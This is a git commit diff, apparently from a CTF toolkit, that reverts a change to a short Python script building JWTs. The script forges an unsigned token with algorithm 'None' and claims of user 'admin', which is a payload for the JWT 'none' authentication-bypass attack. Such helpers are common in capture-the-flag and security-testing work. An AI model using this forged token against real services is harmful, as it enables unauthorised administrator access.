8f7061a08b23be571115ec508a50d52de9aaad4c
AliceInCradle <cs18229177770@outlook.com>
2024-05-09 12:49:47 +0800

    Revert "make.py used in ISCC"
    This reverts commit 48b2e78f8ded1165cefacda94f126e01e5a04a4f.

--- jwt/jwt make.py
+++ jwt/jwt make.py
@@ -2,6 +2,6 @@ import base64
 def jwtBase64Encode(x):
     return base64.b64encode(x.encode('utf-8')).decode().replace('+', '-').replace('/', '_').replace('=', '')
 header = '{"alg": "None","typ": "JWT"}'
-payload = '{"id":"1","username":"admin"} '
+payload = '{"iss": "admin","iat": 1696320196,"exp": 1696327396,"nbf": 1696320196,"sub": "admin","jti": "5fc0ad01ade8340f4c684b39209966a8"} '
 
 print(jwtBase64Encode(header)+'.'+jwtBase64Encode(payload)+'.')
